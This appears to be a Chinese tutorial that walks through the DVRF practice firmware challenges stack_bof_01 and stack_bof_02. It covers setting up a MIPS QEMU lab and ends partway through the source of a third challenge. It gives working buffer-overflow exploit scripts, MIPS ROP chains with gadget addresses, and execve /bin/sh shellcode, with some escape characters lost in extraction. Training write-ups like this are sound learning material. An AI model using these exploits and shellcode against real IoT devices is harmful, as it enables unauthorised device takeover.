> 原文链接: https://www.anquanke.com//post/id/184718 


# IOT设备漏洞挖掘从入门到入门（一）- DVRF系列题目分析


                                阅读量   
                                **509855**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">6</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t0181457581e80e80f0.jpg)](https://p2.ssl.qhimg.com/t0181457581e80e80f0.jpg)



我们现在来调试[DVRF系列练习题](https://github.com/praetorian-code/DVRF)

## 所用工具

### <a class="reference-link" name="builtroot"></a>builtroot

下载

```
wget http://buildroot.uclibc.org/downloads/snapshots/buildroot-snapshot.tar.bz2
tar -jxvf buildroot-snapshot.tar.bz2
cd buildroot
```

配置

```
sudo apt-get install libncurses-dev patch
make clean
make menuconfig
#然后进入到图形化的配置，在Target Architecture中设置目标系统，在toolchain中设置自己主机的内核版本（uname -r）查看，最好在toolchain中也勾选上g++
```

编译

```
sudo apt-get install texinfo
sudo apt-get install bison
sudo apt-get install flex
sudo make
```

设置路径

```
gedit ~/.bashrc
export PATH=$PATH:/Your_Path/buildroot/output/host/usr/bin
source ~/.bashrc
```

### <a class="reference-link" name="binwalk"></a>binwalk

```
sudo apt-get install build-essential autoconf git
sudo apt install binwalk
sudo apt-get install python-lzma
sudo apt-get install python-crypto
sudo apt-get install libqt4-opengl python-opengl python-qt4 python-qt4-gl python-numpy python-scipy python-pip  
sudo pip install pyqtgraph
sudo apt-get install python-pip  
sudo pip install capstone
# Install standard extraction utilities（必选）  
sudo apt-get install mtd-utils gzip bzip2 tar arj lhasa p7zip p7zip-full cabextract cramfsprogs cramfsswap squashfs-tools
# Install sasquatch to extract non-standard SquashFS images（必选）  
git clone https://github.com/devttys0/sasquatch  
cd sasquatch &amp;&amp; ./build.sh
# Install jefferson to extract JFFS2 file systems（可选）  
sudo pip install cstruct  
git clone https://github.com/sviehb/jefferson  
(cd jefferson &amp;&amp; sudo python setup.py install)
# Install ubi_reader to extract UBIFS file systems（可选）  
sudo apt-get install liblzo2-dev python-lzo  
git clone https://github.com/jrspruitt/ubi_reader  
(cd ubi_reader &amp;&amp; sudo python setup.py install)
# Install yaffshiv to extract YAFFS file systems（可选）  
git clone https://github.com/devttys0/yaffshiv  
(cd yaffshiv &amp;&amp; sudo python setup.py install)
# Install unstuff (closed source) to extract StuffIt archive files（可选） 
wget -O - http://my.smithmicro.com/downloads/files/stuffit520.611linux-i386.tar.gz | tar -zxv  
sudo cp bin/unstuff /usr/local/bin/
```

### <a class="reference-link" name="qemu"></a>qemu

```
sudo apt install qemu
sudo apt install qemu-user-static
sudo apt install qemu-system
```

### <a class="reference-link" name="gdb"></a>gdb

#### <a class="reference-link" name="gdb-multiarch"></a>gdb-multiarch

```
sudo apt-get install gdb-multiarch
```

#### <a class="reference-link" name="pwndbg"></a>pwndbg

```
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
```

#### <a class="reference-link" name="%E7%8E%B0%E6%88%90%E7%9A%84%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91%E8%BF%87%E7%9A%84gdbserver"></a>现成的交叉编译过的gdbserver

自己弄真的是很麻烦，拿大佬的现成的用一下<br>[下载地址](https://github.com/rapid7/embedded-tools/blob/master/binaries)

### <a class="reference-link" name="pwntools"></a>pwntools

```
sudo apt-get install libffi-dev
sudo apt-get install libssl-dev
sudo apt-get install python
sudo apt-get install python-pip
sudo pip install pwntools
```

### <a class="reference-link" name="mipsrop"></a>mipsrop

找到了支持IDA7.0的，哭啦，[下载地址](https://github.com/Iolop/ida7.0Plugin)

### <a class="reference-link" name="mips%20qemu%E8%99%9A%E6%8B%9F%E6%9C%BA"></a>mips qemu虚拟机

#### <a class="reference-link" name="%E4%B8%8B%E8%BD%BD"></a>下载

从[下载地址](https://people.debian.org/~aurel32/qemu/)里面选择mips或者mipsel的下载。最好把两个都下载下来，分别放在mips文件夹和mipsel文件夹下面方便区分。

#### <a class="reference-link" name="%E5%90%AF%E5%8A%A8%E8%84%9A%E6%9C%AC%E5%8F%8A%E9%85%8D%E7%BD%AE%E7%BD%91%E7%BB%9C%E7%8E%AF%E5%A2%83"></a>启动脚本及配置网络环境

###### <a class="reference-link" name="%E5%9C%A8%E6%9C%AC%E6%9C%BA%E7%9A%84mips%E6%88%96%E8%80%85mipsel%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%8B%E9%9D%A2%E6%94%BE%E4%B8%A4%E4%B8%AA%E8%84%9A%E6%9C%AC"></a>在本机的mips或者mipsel文件夹下面放两个脚本

1.启动脚本，后面都称之为start.sh（用来启动qemu的）

```
#! /bin/sh    
sudo qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_squeeze_mipsel_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic -net tap
```

2.网络配置脚本，后面都称之为net.sh

```
#! /bin/sh
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -F
sudo iptables -X
sudo iptables -t nat -F
sudo iptables -t nat -X
sudo iptables -t mangle -F
sudo iptables -t mangle -X
sudo iptables -P INPUT ACCEPT
sudo iptables -P FORWARD ACCEPT
sudo iptables -P OUTPUT ACCEPT
sudo iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE
sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT
sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT
sudo ifconfig tap0 192.168.100.254 netmask 255.255.255.0
```

过程是先启动./start.sh,然后打开另外一个窗口，运行./net.sh

##### <a class="reference-link" name="%E5%9C%A8qemu%E9%87%8C%E9%9D%A2%E6%94%BE%E4%B8%80%E4%B8%AA%E8%84%9A%E6%9C%AC"></a>在qemu里面放一个脚本

1.网络配置脚本，后面称之为net.sh

```
#！/bin/sh
ifconfig eth1 192.168.100.2 netmask 255.255.255.0
route add default gw 192.168.100.254
```

在qemu里面运行之后，qemu就能ping通外网啦。



## stack_bof_01

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>漏洞分析

首先查看一下源码

```
#include &lt;string.h&gt;
#include &lt;stdio.h&gt;
//Simple BoF by b1ack0wl for E1550

int main(int argc, char **argv[])`{`
char buf[200] ="";
if (argc &lt; 2)`{`
    printf("Usage: stack_bof_01 &lt;argument&gt;rn-By b1ack0wlrn");
    exit(1);
`}` 
printf("Welcome to the first BoF exercise!rnrn"); 
strcpy(buf, argv[1]);
printf("You entered %s rn", buf);
printf("Try Againrn");
return 0x41; // Just so you can see what register is populated for return statements
`}`

void dat_shell()`{`
printf("Congrats! I will now execute /bin/shrn- b1ack0wlrn");
system("/bin/sh -c");
//execve("/bin/sh","-c",0);
//execve("/bin/sh", 0, 0);
exit(0);
`}`
```

可以看到这里面有一个system函数，并且这个里面有一个strcpy函数，没有对输入的内容限制长度，所以有栈溢出。并且因为main函数是非叶子函数，所以main返回的时候，只要把存放`$ra`寄存器内容的地方覆盖为dat_shell的地址就可以啦。

### <a class="reference-link" name="%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6"></a>查看文件

通过`file`,`checksec`命令，查看文件的指令架构和保护情况

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01cb46f5e038a660a9.png)

### <a class="reference-link" name="IDA%E6%9F%A5%E7%9C%8B"></a>IDA查看

将程序放入到IDA中进行查看，我们根据strcpy可以找到漏洞位置

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0171c854635453d086.png)

strcpy的来源是程序运行的参数。

### <a class="reference-link" name="%E6%9C%AC%E5%9C%B0%E6%A8%A1%E6%8B%9F%E3%80%81%E8%B0%83%E8%AF%95"></a>本地模拟、调试

1.我们首先进行本地的模拟，我们先编写一个调试启动脚本vi local.sh

```
#! /bin/sh
PORT="1234"
#INPUT = `python -c "print open('content1',r).read()"`
cp $(which qemu-mipsel-static) ./qemu
./qemu -L ./ -g $PORT ./pwnable/Intro/stack_bof_01 "`cat content`"
rm ./qemu
```

这个里面用`cat`去获得，而不是python，是因为python有可能会截断

2.首先确定一个偏移，我们用`python patternLocOffset -c -l 600 -f content`生成一个输入脚本content，然后用local.sh起起来，用`gdb-multiarch`调试，最终得到寄存器`$ra`的值`0x41386741`,然后用`python patternLocOffset -s 0x41386741 -l 600`得到偏移是204。

[![](https://p0.ssl.qhimg.com/t01c856db5f9fecde62.png)](https://p0.ssl.qhimg.com/t01c856db5f9fecde62.png)

3.编写利用脚本，`vi content.py`为

```
from pwn import *
f=open("content","wb")
data = "a"*204
data+="bbbb"
f.write(data)
f.close()
```

4.然后我们拿这个content.py生成的content运行，然后调试，可以看到我们已经成功的劫持了控制流。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t013afa71a4ad0d7d9d.png)

5.接下来，我们就想直接将dat_shell的地址直接写到上面，然后直接执行，我们尝试了一下，结果出现错误。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t016e3c8e0ddb686c48.png)

可以看到是因为改变了寄存器`$gp`的值，这里引用大佬文章中的内容：

```
访问了非法内存，异常了。原因在于，在MIPS中，函数内部会通过$t9寄存器和$gp寄存器来找数据，地址等。同时在mips的手册内默认$t9的值为当前函数的开始地址，这样才能正常的索引。
```

所以，我们需要先用一个`rop_gadget`给`$t9`赋值，然后我们在`libc.so.0`中找到了一个gadget，如下所示：

```
.text:00006B20                 lw      $t9, arg_0($sp)
.text:00006B24                 jalr    $t9
```

如果我们想要使用这个gadget的话，我们必须先找到libc的基地址，我比较喜欢用gdb来调试，因为这个没有开启地址随机化，所以我们先关闭地址随机化。

```
sudo su
echo 0 &gt; /proc/sys/kernel/randomize_va_space
```

然后我们可以根据`vmmap`来得到libc的基地址`0x766e5000`，如下图所示：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t011c798d93ddc5dd5d.png)

6.最后，我们写一下生成content的python脚本：

```
from pwn import *
libc_base = 0x766e5000
gadget = 0x6b20
gadget_addr = libc_base + gadget
shell_addr = 0x400950
f=open("content","wb")
data = "a"*204
data+=p32(gadget_addr)
data+=p32(shell_addr)
f.write(data)
f.close()
```

### <a class="reference-link" name="qemu%E6%A8%A1%E6%8B%9F%E8%B0%83%E8%AF%95"></a>qemu模拟调试

1.先启动qemu，配置好网络环境，依次运行start.sh，net.sh（看上面介绍），在qemu里面运行net.sh，并且也要运行一下

```
echo 0 &gt; /proc/sys/kernel/randomize_va_space
```

因为我们用的是debian的，他里面是开了地址随机化的，所以我们要先关闭地址随机化。<br>
2.将之前在本地运行好的content拷过去

```
scp content root@192.168.100.3:/root/
```

3.我们直接运行的话，没有成功，猜测是因为libc的基地址的问题，所以我们要先调试一下。依次运行下面的指令(经过了很长时间的摸索)：

```
#在qemu里面
chroot . ./gdbserver.mipsel 192.168.100.254:6666 ./pwnable/Intro/stack_bof_01 "`cat content`"
#一定要在cat content的外面加上“”，我在这吃了大亏，调试了半天，输入总是不对
#在本机中运行
gdb-multiarch ./pwnable/Intro/stack_bof_01
set arch mips #可选
set endian big/little #可选
target remote 192.168.100.3:6666
#进入到gdb中
b *0x400948
c
vmmap
#出现下面的图
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0195a4e93487472ce0.png)

其中可以看到libc的基地址是`0x77ee2000`,我们在content.py脚本中修改一下libc的基地址，在qemu中运行就可以啦。

成功如下图所示：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01ee05a91e279b77fb.png)

### <a class="reference-link" name="%E6%80%BB%E7%BB%93"></a>总结

这道题目其实很简单，但是其中的调试方法自己摸索了好几天，简单来说，就是在qemu中运行

```
chroot . ./gdbserver.mipsel 调试机ip:6666 程序路径 程序参数
```

在本机中运行

```
gdb-multiarch 程序路径
set arch mips
set endian big/little
target remote 目标机ip:6666
```

而且在调试过程中遇到了大大小小的问题，真的是学海无涯苦作舟啊。



## stack_bof_02

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>漏洞分析

我们首先看一下源码

```
#include &lt;string.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
//Simple BoF by b1ack0wl for E1550
//Shellcode is Required
int main(int argc, char **argv[])`{`
char buf[500] ="";
if (argc &lt; 2)`{`
    printf("Usage: stack_bof_01 &lt;argument&gt;rn-By b1ack0wlrn");
    exit(1);
`}` 
printf("Welcome to the Second BoF exercise! You'll need Shellcode for this! ;)rnrn"); 
strcpy(buf, argv[1]);
printf("You entered %s rn", buf);
printf("Try Againrn");
return 0;
`}`
```

我们可以看到，这依然是一个简单的栈溢出，参数从程序参数中获取，在用strcpy进行赋值的时候，没有检查长度，导致了栈溢出。因为main函数是非叶子函数，所以当溢出的时候，会覆盖到存放`$ra`的地方，所以当返回的时候，寄存器`$ra`发生变化。这道题目和上面一道题目不同的地方在于，程序里面没有system调用，所以需要调用shellcode。

### <a class="reference-link" name="%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6"></a>查看文件

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t013407d1bfd00b32e9.png)

我们可以看到，各种保护都没有开，32位小端程序

### <a class="reference-link" name="IDA%E6%9F%A5%E7%9C%8B"></a>IDA查看

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01e6aecf08037bd299.png)

由上面我们可以看到，输入来源是程序的输入，然后经过了strcpy，没有经过检查，所以有栈溢出。

### <a class="reference-link" name="%E6%9C%AC%E5%9C%B0%E6%A8%A1%E6%8B%9F%E3%80%81%E8%B0%83%E8%AF%95"></a>本地模拟、调试

1.我们首先还是先编写一个启动脚本local.sh:

```
#! /bin/sh
PORT="1234"
cp $(which qemu-mipsel-static) ./qemu
./qemu -L ./ -g $PORT ./pwnable/Intro/stack_bof_01 "`cat content1`"
rm ./qemu
```

2.然后确定一个偏移，我们用`python patternLocOffset -c -l 600 -f content`生成一个输入脚本content1，然后用local1.sh起起来，用`gdb-multiarch`调试，最终得到寄存器`$ra`的值`0x72413971`,然后用`python patternLocOffset -s 0x72413971 -l 600`得到偏移是508。

[![](https://p5.ssl.qhimg.com/t018c5614c4510828f9.png)](https://p5.ssl.qhimg.com/t018c5614c4510828f9.png)

3.编写利用脚本，`vi content1.py`为

```
from pwn import *
f=open("content1","wb")
data = "a"*508
data+="bbbb"
f.write(data)
f.close()
```

4.然后我们拿这个content1.py生成的content1运行，然后调试，可以看到我们已经成功的劫持了控制流。

[![](https://p1.ssl.qhimg.com/t01690d23c593134bb7.png)](https://p1.ssl.qhimg.com/t01690d23c593134bb7.png)

5.下面就要进行我们的重点了，也就是rop链的生成。这里有一点需要说的是，我们在调用我们的shellcode之前，要先调用一个`sleep(1)`，（原理的话，引用大佬的话，就是在构造ROP的时候调用sleep()函数，是的D-cach写回，I-cache生效）。

1)所以，这个里面，我们需要先一个gadget，把寄存器`$a0`赋值为`1`的gadget。我们用mipsrop.find(“li `$a0`,1”)

```
----------------------------------------------------------------------------------------------------------------
|  Address     |  Action                                              |  Control Jump                          |
----------------------------------------------------------------------------------------------------------------
|  0x00018AA8  |  li $a0,1                                            |  jalr  $s3                             |
|  0x0002FB10  |  li $a0,1                                            |  jalr  $s1                             |
|  0x00012D3C  |  li $a0,1                                            |  jr    0x28+var_8($sp)                 |
|  0x00022420  |  li $a0,1                                            |  jr    0x28+var_8($sp)                 |
|  0x0002A9C8  |  li $a0,1                                            |  jr    0x20+var_4($sp)                 |
----------------------------------------------------------------------------------------------------------------
```

我们随便挑选一个，0x2fb10，这个里面的gadget0是

```
.text:0002FB10                 li      $a0, 1
.text:0002FB14                 move    $t9, $s1
.text:0002FB18                 jalr    $t9 ; sub_2F818
.text:0002FB1C                 ori     $a1, $s0, 2
```

2)根据第一个gadget，我们需要一个能给寄存器`$s1`赋值的那么一个gadget1，我们用指令mipsrop.find(“lw `$s1`,”)，找到了好多，我们随便挑一个，既给寄存器赋值，又用这个寄存器跳转的，

```
.text:00006A50                 lw      $ra, 0x68+var_4($sp)
.text:00006A54                 lw      $s2, 0x68+var_8($sp)
.text:00006A58                 lw      $s1, 0x68+var_C($sp)
.text:00006A5C                 lw      $s0, 0x68+var_10($sp)
.text:00006A60                 jr      $ra
```

3）所以这个时候，我们的利用脚本如下：

```
"a"*508
p32(gadget1+libc_base)
"b"*0x58
"????" #s0
"????" #s1
"????" #s2
p32(gadget0+libc_base)
```

4)我们这个时候就要想一下，我们在s1的位置填写什么地址，是`sleep`函数的地址嘛？显然不是的，如果这个地方填写了`sleep`函数的地址，那么就直接跳转进`sleep`函数，而`$ra`寄存器还是gadget0的地址，执行完`sleep`函数之后，就又回到了这里，所以这里需要一个既能利用`$s0`或者`$s2`寄存器跳转，并且还能给`$ra`寄存器赋值的gadget2，我们用指令mipsrop.tali()寻找，经过查看，我们采用下面的gadget：

```
.text:00020F1C                 move    $t9, $s2
.text:00020F20                 lw      $ra, 0x28+var_4($sp)
.text:00020F24                 lw      $s2, 0x28+var_8($sp)
.text:00020F28                 lw      $s1, 0x28+var_C($sp)
.text:00020F2C                 lw      $s0, 0x28+var_10($sp)
.text:00020F30                 jr      $t9
```

所以，这个时候的利用脚本变成下面的样子：

```
"a"*508
p32(gadget1+libc_base)
"b"*0x58
"bbbb" #s0
p32(gadget2+libc_base) #s1
p32(sleep_offset+libc_base) #s2
p32(gadget0+libc_base)
#---------
"c"*0x18
"cccc" #s0
"cccc" #s1
"cccc" #s2
"????" #ra
```

5)我们接下来寻找一个执行完`sleep`函数，跳转的地址，因为这个程序里面栈上可以执行，所以我们在上面部署shellcode，然后跳转过去即可，接下来我们要寻找一个跳转到栈上某个位置的gadget3，没有找到，然后就想先控制一个寄存器的值为栈上的一个值，然后在跳转到这，因此我们用mipsrop.findstacker()寻找，

```
.text:00016DD0                 addiu   $a0, $sp, 0x58+var_40
.text:00016DD4                 move    $t9, $s0
.text:00016DD8                 jalr    $t9
```

第一个gadget3如上所示，也就是，因此我们需要先控制寄存器`$s0`，我们看到上面的gadget2，还能控制寄存器`$s0`。

6）接下来我们寻找一个利用`$a0`跳转的gadget4，我们用mipsrop.find(“move `$t9`,`$a0`“)，我们如愿找到一个

```
.text:000214A0                 move    $t9, $a0
.text:000214A4                 sw      $v0, 0x38+var_20($sp)
.text:000214A8                 jalr    $t9
```

所以我们的利用脚本变成下面的样子：

```
"a"*508
p32(gadget1+libc_base)
"b"*0x58
"bbbb" #s0
p32(gadget2+libc_base) #s1
p32(sleep_offset+libc_base) #s2
p32(gadget0+libc_base)
#---------
"c"*0x18
p32(gadget4+libc_base) #s0
"cccc" #s1
"cccc" #s2
p32(gadget3+libc_base) #ra
#---------
"d"*0x18
shellcode
```

7)我们接下来就是填充shellcode，找到一个[网站](http://shell-strom.org/shellcode)，在上面找到一个mips大端的`execve /bin/sh`的shellcode，将其转换成小端的shellcode如下：

```
shellcode = “”
shellcode += "xffxffx06x28"  # slti $a2, $zero, -1
shellcode += "x62x69x0fx3c"  # lui $t7, 0x6962
shellcode += "x2fx2fxefx35"  # ori $t7, $t7, 0x2f2f
shellcode += "xf4xffxafxaf"  # sw $t7, -0xc($sp)
shellcode+= "x73x68x0ex3c"  # lui $t6, 0x6873
shellcode += "x6ex2fxcex35"  # ori $t6, $t6, 0x2f6e
shellcode += "xf8xffxaexaf"  # sw $t6, -8($sp)
shellcode += "xfcxffxa0xaf"  # sw $zero, -4($sp)
shellcode += "xf4xffxa4x27"  # addiu $a0, $sp, -0xc
shellcode += "xffxffx05x28"  # slti $a1, $zero, -1
shellcode += "xabx0fx02x24"  # addiu;$v0, $zero, 0xfab
shellcode += "x0cx01x01x01"  # syscall 0x40404
```

8)我们将上面的一系列内容编写成contnt.py，如下：

```
from pwn import *
context.endian = "little"
context.arch = "mips"
f=open("content1","wb")
shellcode = ""
shellcode += "xffxffx06x28"  # slti $a2, $zero, -1
shellcode += "x62x69x0fx3c"  # lui $t7, 0x6962
shellcode += "x2fx2fxefx35"  # ori $t7, $t7, 0x2f2f
shellcode += "xf4xffxafxaf"  # sw $t7, -0xc($sp)
shellcode+= "x73x68x0ex3c"  # lui $t6, 0x6873
shellcode += "x6ex2fxcex35"  # ori $t6, $t6, 0x2f6e
shellcode += "xf8xffxaexaf"  # sw $t6, -8($sp)
shellcode += "xfcxffxa0xaf"  # sw $zero, -4($sp)
shellcode += "xf4xffxa4x27"  # addiu $a0, $sp, -0xc
shellcode += "xffxffx05x28"  # slti $a1, $zero, -1
shellcode += "xabx0fx02x24"  # addiu;$v0, $zero, 0xfab
shellcode += "x0cx01x01x01"  # syscall 0x40404
gadget0 = 0x2fb10
gadget1 = 0x6A50
gadget2 = 0x20F1C 
gadget3 = 0x16DD0
gadget4 = 0x214A0 
libc_base = 0x766e5000
sleep_offset = 0x2F2B0
data = "a"*508
data += p32(gadget1+libc_base)
data += "b"*0x58
data += "bbbb" #s0
data += p32(gadget2+libc_base) #s1
data += p32(sleep_offset+libc_base) #s2
data += p32(gadget0+libc_base)
data +="c"*0x18
data += p32(gadget4+libc_base) #s0
data += "cccc" #s1
data += "cccc" #s2
data += p32(gadget3+libc_base) #ra
data += "d"*0x18
data += shellcode
f.write(data)
f.close()
```

然后我们python content1.py，生成一个content1，然后运行./local1.sh,另外一个窗口运行gdb调试，然后下断点`b *0x767064A0`，运行下去，可以看到寄存器`$t9`已经变成了shellcode的位置，接下来就是跳转到那边，我们看一下内存中的内容，看到如下图内容：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t019c7f0f2de50e09eb.png)

也就是第一条汇编指令不是我们的汇编指令，后面一样，尽管执行成功了，但是心里不爽，看大佬们的内容，可以在前面加几句无关紧要的东西，使其正确跳转过来，就像nop一样(这个里面nop不行的原因是其机器码是x00x00x00x00)。在这个里面增加的指令是`xor $t0,$t0,$t0`，在IDA中用keypatch看一下机起码为下图内容：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01a0ac870b583ec154.png)

所以我们在shellcode前面加上几句”x26x40x08x01”即可。

### <a class="reference-link" name="qemu%E6%A8%A1%E6%8B%9F%E8%B0%83%E8%AF%95"></a>qemu模拟调试

这道题目的qemu的模拟，用的还是之前的那道题目相同的环境，我在这里只介绍一下具体的流程：

1.先启动qemu，配置好网络环境，依次运行start.sh，net.sh（看上面介绍），在qemu里面运行net.sh，并且也要运行一下

```
echo 0 &gt; /proc/sys/kernel/randomize_va_space
```

因为我们用的是debian的，他里面是开了地址随机化的，所以我们要先关闭地址随机化。（注意，这里一定要弄，我就在qemu里面调试的时候费了好长时间，总是发生错误，后来知道是没有关闭地址随机化）

2.将之前在本地运行好的content1拷过去

```
scp content1 root@192.168.100.3:/root/
```

3.自然是寻找libc的地址，用的还是之前的方法（我在想能不能像ctf题目一样泄漏libc的地址呢？回头研究一下，如果有大佬能提点一下的话，会更好）

```
#在qemu里面
chroot . ./gdbserver.mipsel 192.168.100.254:6666 ./pwnable/ShellCode_Required/stack_bof_02 "`cat content1`"
#在本机中运行
gdb-multiarch ./pwnable/Intro/stack_bof_01
set arch mips #可选
set endian big/little #可选
target remote 192.168.100.3:6666
#进入到gdb中
b *0x400928
c
vmmap
```

其中可以看到libc的基地址是`0x77ee2000`,我们在content1.py脚本中修改一下libc的基地址，生成相应的content1，然后拷贝进qemu中，在qemu中运行，然后失败了，跟踪的时候，是执行/bin/sh的时候，不知道什么原因，后来改了一个shellcode，改后的shellcode为：

```
shellcode = ""
shellcode += "x26x40x08x01"
shellcode += "xffxffx10x04xabx0fx02x24"
shellcode += "x55xf0x46x20x66x06xffx23"
shellcode += "xc2xf9xecx23x66x06xbdx23"
shellcode += "x9axf9xacxafx9exf9xa6xaf"
shellcode += "x9axf9xbdx23x21x20x80x01"
shellcode += "x21x28xa0x03xccxcdx44x03"
shellcode += "/bin/sh";
```

然后运行生成content1，上传，运行`chroot . ./pwnable/ShellCode_Required/stack_bof_02 "`cat content1`"`成功如下图所示：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0177f5ac1d0a686080.png)

### <a class="reference-link" name="%E6%80%BB%E7%BB%93"></a>总结

在这次的实验过程中，rop的构造还是顺利的，当然，还有很多其他的方法。遇到坑的地方，一个就是shellcode的选择，有的用qemu用户态可以成功，但是qemu system态模拟的时候，没有成功，说是非法指令，只能更换一个shellcode。第二个坑，就是获取libc_base，以及模拟运行调试的时候，每一次开qemu都忘记了关闭地址随机化，导致运行总是不对，后来关闭地址随机化，更换新的shellcode，就运行成功了。（希望之后可以通过泄漏的方式来获取libc基地址，这样就会比较好）

## socket_bof

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>漏洞分析

首先看一下源码：

```
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netdb.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;


int main(int argc, char **argv[])
`{`
    if (argc &lt;2)
    `{`
        printf("Usage: %s port_number - by b1ack0wln", argv[0]);
        exit(1);
    `}`

    char str[500] = "";
    char endstr[50] = "";
    int listen_fd, comm_fd;
    int retval = 0;
    int option = 1;
    struct sockaddr_in servaddr;

    listen_fd = socket(AF_INET, SOCK_STREAM, 0);

    bzero( &amp;servaddr, sizeof(servaddr));

    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = htons(INADDR_ANY);
    servaddr.sin_port = htons(atoi(argv[1]));
    printf("Binding to port %in", atoi(argv[1]));

    retval = bind(listen_fd, (struct sockaddr *) &amp;servaddr, sizeof(servaddr));
    if (retval == -1)
    `{`
        printf("Error Binding to port %in", atoi(argv[1]));
         exit(1);
     `}`
     if(setsockopt(listen_fd, SOL_SOCKET,SO_REUSEADDR, (char*)&amp;option, sizeof(option)) &lt; 0)
     `{`
        printf("Setsockopt failed :(n");
        close(listen_fd);
        exit(2);
    `}`
    listen(listen_fd, 2);
